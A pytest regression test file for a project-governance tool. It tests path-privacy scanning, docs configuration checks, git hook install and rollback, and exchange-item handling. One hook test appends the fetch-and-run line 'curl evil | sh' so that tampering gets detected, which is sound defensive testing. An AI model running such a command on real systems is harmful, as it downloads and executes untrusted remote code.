"""0.12.0: the known issues of 0.10.0 and 0.11.0 (RELEASE_v0.12.0_SPEC §2). One regression test per finding."""

import os
import shutil

import pytest

from conftest import EXAMPLE, codes, one


@pytest.fixture(autouse=True)
def _hermetic(monkeypatch, tmp_path):
    monkeypatch.setenv("GIT_CONFIG_GLOBAL", os.devnull)
    monkeypatch.setenv("STEWARD_CONFIG_HOME", str(tmp_path / "home"))


@pytest.fixture
def proj(tmp_path, monkeypatch):
    root = tmp_path / "toy"
    shutil.copytree(EXAMPLE, root, ignore=shutil.ignore_patterns(".steward", "__pycache__", "*.aux", "*.fls", "*.log"))
    with open(root / "steward.toml", "a") as f:
        f.write('\n[docs]\ntitle = "Toy benchmark"\n')
    monkeypatch.chdir(root)
    return root


# ---------------------------------------------------------------- T8: a bare home directory
@pytest.mark.parametrize("text, hit", [
    ("/" "Users/alice", True), ("see /" "home/bob.", True), ('"/' 'Users/alice"', True), ("C:\\" "Users\\bob", True),  # scrub: allow; steward: allow R-07 (synthetic)
    ("/" "Users/alice/x", True), ("/" "Users/you", False), ("https://example.org/" "home/bob", False),  # scrub: allow; steward: allow R-07 (synthetic)
    ("/" "home/<name>/", False), ("/" "Users/alice2/x and /Users/", True)])  # scrub: allow; steward: allow R-07 (synthetic)
def test_T8_a_bare_home_directory_is_a_local_path(text, hit):
    from steward.privacy import scan_text

    assert bool(scan_text(text, [], True)[0]) is hit


def test_T8_a_bare_home_directory_in_a_title_refuses_the_site(cli, proj):
    t = (proj / "steward.toml").read_text().replace('title = "Toy benchmark"', 'title = "Built in /' 'Users/alice"')  # scrub: allow; steward: allow R-07 (synthetic)
    (proj / "steward.toml").write_text(t)
    code, _, err = cli("docs", "build")
    assert code == 65 and "local path" in err and not (proj / "docs/project").exists()


# ---------------------------------------------------------------- T9: docs settings MkDocs cannot build
@pytest.mark.parametrize("setting", [
    'generated = "docs"',                    # equal to dir
    'generated = "site/project"',            # inside the repository but outside dir
    'generated = ""',                        # empty
    'generated = "docs/my #pages"',          # YAML-significant
    'dir = "my docs"\ngenerated = "my docs/project"',
    'generated = "docs/./project"',
])
def test_T9_a_setting_mkdocs_cannot_build_is_refused_by_the_configuration(cli, proj, setting):
    t = (proj / "steward.toml").read_text().replace('[docs]\n', f"[docs]\n{setting}\n")
    (proj / "steward.toml").write_text(t)
    code, _, err = cli("docs", "init")
    assert code == 64 and "not valid" in err, err
    assert not (proj / "mkdocs.yml").exists()
    _, out, _ = cli("check", "config")
    assert "docs" in out


def test_T9_control_a_nested_generated_folder_is_accepted(cli, proj):
    t = (proj / "steward.toml").read_text().replace('[docs]\n', '[docs]\ngenerated = "docs/site-pages/project"\n')
    (proj / "steward.toml").write_text(t)
    assert cli("docs", "init")[0] == 0
    assert "site-pages/project/overview.md" in (proj / "mkdocs.yml").read_text()


# ---------------------------------------------------------------- T14: exchange item files in the provenance
def test_T14_a_body_only_edit_of_an_exchange_item_makes_the_page_stale(cli, proj):
    t = (proj / "steward.toml").read_text().replace('[docs]\n', '[docs]\npublish = ["overview", "exchange"]\n')
    (proj / "steward.toml").write_text(t + '\n[exchange]\ncode = "TOY"\n')
    assert cli("exchange", "init")[0] == 0
    assert cli("exchange", "new", "request", "--to", "PEER", "--title", "A need")[0] == 0
    assert cli("docs", "build")[0] == 0
    page = (proj / "docs/project/exchange.md").read_text()
    assert "exchange/*/*.md` (1 files" in page, page
    _, rep = cli.check(proj, "docs")
    assert one(rep, "R-69")["status"] == "PASS", one(rep, "R-69")
    item = next((proj / "exchange/outbox").glob("*.md"))
    item.write_text(item.read_text() + "\nA body-only edit.\n")
    _, rep = cli.check(proj, "docs")
    assert "R-69.stale" in codes(one(rep, "R-69"))


# ---------------------------------------------------------------- S4 (and the R5 note): hooks as a recorded transaction
import json
import subprocess

git_needed = pytest.mark.skipif(not shutil.which("git"), reason="needs git")


def _sh(cwd, *a):
    return subprocess.run(a, cwd=cwd, check=True, capture_output=True, text=True).stdout.strip()


@pytest.fixture
def repo(cli, tmp_path, monkeypatch):
    r = tmp_path / "p"
    r.mkdir()
    cli("init", "--repo", r)
    monkeypatch.chdir(r)
    _sh(r, "git", "init", "-q", "-b", "main")
    (r / ".git/hooks").mkdir(exist_ok=True)
    for f in (r / ".git/hooks").glob("*.sample"):
        f.unlink()
    return r


ORIGINAL = b"#!/bin/sh\necho mine\nexit 0\n"


@git_needed
@pytest.mark.parametrize("fail_at", ["final_manifest", "second_hook"])
def test_S4_a_failure_part_way_leaves_every_hook_recorded_and_removable(repo, monkeypatch, fail_at):
    from steward import hooks as hk

    hooks = repo / ".git/hooks"
    (hooks / "pre-commit").write_bytes(ORIGINAL)
    real_save, real_write, calls = hk._HooksDir.save_manifest, hk._HooksDir.write, []

    def save(self, doc):
        calls.append("save")
        if fail_at == "final_manifest" and calls.count("save") == 2:
            raise OSError("disk full")
        return real_save(self, doc)

    def write(self, name, data, mode):
        if fail_at == "second_hook" and name == "pre-push":
            raise OSError("disk full")
        return real_write(self, name, data, mode)

    monkeypatch.setattr(hk._HooksDir, "save_manifest", save)
    monkeypatch.setattr(hk._HooksDir, "write", write)
    with pytest.raises(OSError):
        hk.install(repo, [], "default", force=False, chain=True)
    monkeypatch.setattr(hk._HooksDir, "save_manifest", real_save)
    monkeypatch.setattr(hk._HooksDir, "write", real_write)
    hk.remove(repo)
    assert (hooks / "pre-commit").read_bytes() == ORIGINAL  # the adopter's hook is back, byte for byte
    assert not (hooks / "pre-push").exists() and not (hooks / "pre-commit.local").exists()


@git_needed
@pytest.mark.parametrize("content", [b"{not json", b"[]", b"[" * 100000, b'{"pre-commit": 3}'])
def test_S4_an_invalid_manifest_is_kept_and_refused_with_a_diagnostic(cli, repo, content):
    hooks = repo / ".git/hooks"
    (hooks / ".steward-hooks.json").write_bytes(content)
    for verb in (("hooks", "install"), ("hooks", "remove")):
        code, out, err = cli(*verb)
        assert code != 0 and "not a valid steward hooks manifest" in (out + err), (out, err)
    assert (hooks / ".steward-hooks.json").read_bytes() == content
    assert not (hooks / "pre-commit").exists()


@git_needed
def test_S4_a_stock_090_chain_is_upgraded_by_install_chain_and_then_removable(cli, repo):
    from steward import hooks as hk

    hooks = repo / ".git/hooks"
    (hooks / "pre-commit.local").write_bytes(ORIGINAL)
    (hooks / "pre-commit").write_text(hk.render_chained("pre-commit", "default", []))  # as 0.9.0 left it, no manifest
    assert cli("hooks", "install", "--chain")[0] == 0
    man = json.loads((hooks / ".steward-hooks.json").read_text())
    assert man["pre-commit"]["chained"] is True and "previous" not in man["pre-commit"]
    cli("hooks", "remove")
    assert (hooks / "pre-commit").read_bytes() == ORIGINAL and not (hooks / "pre-commit.local").exists()


@git_needed
def test_R5_a_chained_original_changed_after_chaining_is_not_restored(cli, repo):
    hooks = repo / ".git/hooks"
    (hooks / "pre-commit").write_bytes(ORIGINAL)
    assert cli("hooks", "install", "--chain")[0] == 0
    (hooks / "pre-commit.local").write_bytes(b"#!/bin/sh\necho swapped\n")
    _, out, _ = cli("hooks", "remove")
    assert "changed since it was chained" in out
    assert not (hooks / "pre-commit").exists() and (hooks / "pre-commit.local").read_bytes() == b"#!/bin/sh\necho swapped\n"


@git_needed
def test_R5_an_unrecorded_plain_hook_counts_only_when_its_bytes_are_exact(repo):
    from steward import hooks as hk

    good = hk.render("pre-commit", "default", []).encode()
    assert hk.legacy("pre-commit", good) == "plain"
    assert hk.legacy("pre-commit", good + b"curl evil | sh\n") is None
    assert hk.legacy("pre-commit", hk.MARK.encode() + b"\n") is None


# ---------------------------------------------------------------- S5: R-53 and a non-UTF-8 item
@pytest.mark.parametrize("where", ["body", "header"])
def test_S5_an_item_with_invalid_bytes_fails_r53_with_its_path(cli, proj, where):
    with open(proj / "steward.toml", "a") as f:
        f.write('\n[exchange]\ncode = "TOY"\n')
    assert cli("exchange", "init")[0] == 0
    assert cli("exchange", "new", "request", "--to", "PEER", "--title", "A need")[0] == 0
    _, rep = cli.check(proj, "governance")
    assert one(rep, "R-53")["status"] == "PASS", one(rep, "R-53")
    item = next((proj / "exchange/outbox").glob("*.md"))
    data = item.read_bytes()
    data = data + b"\nbad \xff byte\n" if where == "body" else data.replace(b"A need", b"A \xff need")
    item.write_bytes(data)
    _, rep = cli.check(proj, "governance")
    res = one(rep, "R-53")
    assert res["status"] == "FAIL" and any(d.get("code") == "R-53.invalid" and d.get("path", "").endswith(item.name)
                                           for d in res["details"]), res
    assert "\xff" not in str(res)


# ---------------------------------------------------------------- S6: the scrub check never passes without scanning
def _scrub():
    import sys
    from conftest import REPO
    sys.path.insert(0, str(REPO / "tools"))
    import scrub_check
    return scrub_check


def _scrub_repo(tmp_path, files):
    (tmp_path / "development").mkdir()
    (tmp_path / "development/ADOPTION.md").write_text("- **Acme-Lab (ACL):** an adopter\n")
    for rel, data in files.items():
        (tmp_path / rel).parent.mkdir(parents=True, exist_ok=True)
        (tmp_path / rel).write_bytes(data)
    _sh(tmp_path, "git", "init", "-q")
    if files:
        _sh(tmp_path, "git", "add", "-f", *files)


def test_S6_a_failed_inventory_is_a_finding(tmp_path):
    sc = _scrub()
    found = sc.findings(tmp_path)  # not a git repository: ls-files fails
    assert found and found[0].startswith("inventory:"), found


def test_S6_an_empty_inventory_is_a_finding(tmp_path):
    sc = _scrub()
    _scrub_repo(tmp_path, {})
    assert sc.findings(tmp_path)[0].startswith("inventory: no published files")


def test_S6_an_unreadable_or_undecodable_text_file_is_a_finding(tmp_path):
    sc = _scrub()
    _scrub_repo(tmp_path, {"README.md": b"fine\n", "docs/a.md": b"bad \xff\n", "docs/logo.png": b"\x89PNG\xff"})
    found = sc.findings(tmp_path)
    assert any(f.startswith("docs/a.md: not UTF-8") for f in found) and not any("logo.png" in f for f in found), found
    (tmp_path / "README.md").unlink()
    (tmp_path / "README.md").mkdir()  # tracked, but no longer a readable file
    assert any(f.startswith("README.md: cannot be read") for f in sc.findings(tmp_path))


def test_S6_an_adopter_code_from_the_map_is_found(tmp_path):
    sc = _scrub()
    _scrub_repo(tmp_path, {"README.md": b"As ACL asked in ACL-REQ-004.\nACLX and acl are words.\n"})
    found = sc.findings(tmp_path)
    assert found == ["README.md:1: adopter code"], found


# ---------------------------------------------------------------- S7: exchange creation leaves nothing behind
@pytest.mark.parametrize("fail", ["dup", "fstat", "write"])
def test_S7_a_failure_while_creating_an_item_leaves_no_item_and_no_ledger_entry(cli, proj, monkeypatch, fail):
    import steward.exchange as xc
    import steward.fsutil as fs

    with open(proj / "steward.toml", "a") as f:
        f.write('\n[exchange]\ncode = "TOY"\n')
    assert cli("exchange", "init")[0] == 0
    log = (proj / "exchange/log.jsonl")
    before = log.read_bytes() if log.exists() else b""

    def boom(*a, **k):
        raise OSError(24, "Too many open files")
    target = {"dup": (os, "dup"), "fstat": (os, "fstat"), "write": (fs, "write_all")}[fail]
    with monkeypatch.context() as m:
        m.setattr(*target, boom)
        try:
            cli("exchange", "new", "request", "--to", "PEER", "--title", "A need")
        except OSError:
            pass
    assert list((proj / "exchange/outbox").glob("*.md")) == []
    assert (log.read_bytes() if log.exists() else b"") == before
    assert cli("exchange", "new", "request", "--to", "PEER", "--title", "A need")[0] == 0  # the ID is not burnt
    assert [p.name for p in (proj / "exchange/outbox").glob("*.md")] == ["TOY-REQ-001.md"]


# ---------------------------------------------------------------- S8: the reference generator and links
def _gen():
    import sys
    from conftest import REPO
    sys.path.insert(0, str(REPO / "tools"))
    import build_rule_reference
    return build_rule_reference


@pytest.mark.parametrize("link", ["folder", "leaf"])
def test_S8_a_linked_output_is_refused_and_its_target_unchanged(tmp_path, link):
    gen = _gen()
    root, outside = tmp_path / "r", tmp_path / "outside"
    (root / "docs").mkdir(parents=True)
    outside.mkdir()
    (outside / "rules.md").write_text("keep\n")
    if link == "folder":
        (root / "docs/reference").symlink_to(outside)
    else:
        (root / "docs/reference").mkdir()
        (root / "docs/reference/rules.md").symlink_to(outside / "rules.md")
    for check in (True, False):
        assert gen.main(check, root) == 2
    assert (outside / "rules.md").read_text() == "keep\n" and sorted(p.name for p in outside.iterdir()) == ["rules.md"]


def test_S8_control_a_plain_folder_is_written_then_current(tmp_path):
    gen = _gen()
    root = tmp_path / "r"
    (root / "docs").mkdir(parents=True)
    assert gen.main(True, root) == 1
    assert gen.main(False, root) == 0 and gen.main(True, root) == 0


# ---------------------------------------------------------------- S9: explain and the reference list every code
def _emitted(rep):
    return {(r["rule"], d["code"]) for r in rep["verdict"]["results"] for d in r["details"] if d.get("code")}


def test_S9_every_emitted_code_is_listed_and_no_fragment_is(cli, proj):
    from steward.cli import code_fixes, rule_codes
    from steward.rules import RULES

    with open(proj / "steward.toml", "a") as f:
        f.write('\n[exchange]\ncode = "TOY"\n\n[[terms]]\nname = "gone"\nfile = "development/gone.txt"\n'
                '\n[[terms]]\nname = "bad"\nfile = "development/bad.txt"\n')
    (proj / "development/bad.txt").write_bytes(b"\xff\xfe\n")  # R-07.list_unreadable (dynamic)
    cli("exchange", "init")
    cli("exchange", "new", "request", "--to", "PEER", "--title", "A need")
    item = next((proj / "exchange/outbox").glob("*.md"))
    item.write_bytes(item.read_bytes() + b"\xff")  # R-53.invalid (through a helper)
    _, rep = cli.check(proj)
    emitted = _emitted(rep)
    assert ("R-07", "R-07.list_unreadable") in emitted and ("R-53", "R-53.invalid") in emitted
    for rule, code in emitted:
        if code.startswith(rule + "."):
            assert code in rule_codes(rule), (rule, code)
    for rule in RULES:
        assert not [c for c in rule_codes(rule) if c.endswith("_")], rule
    assert code_fixes("R-07")["R-07.local_path"]  # a code-specific remedy, from the same detail in the source


def test_S9_explain_prints_codes_with_their_own_remedies(cli):
    code, out, _ = cli("explain", "R-53")
    assert code == 0 and "  R-53.invalid" in out and "R-53.awaiting_reply: " in out
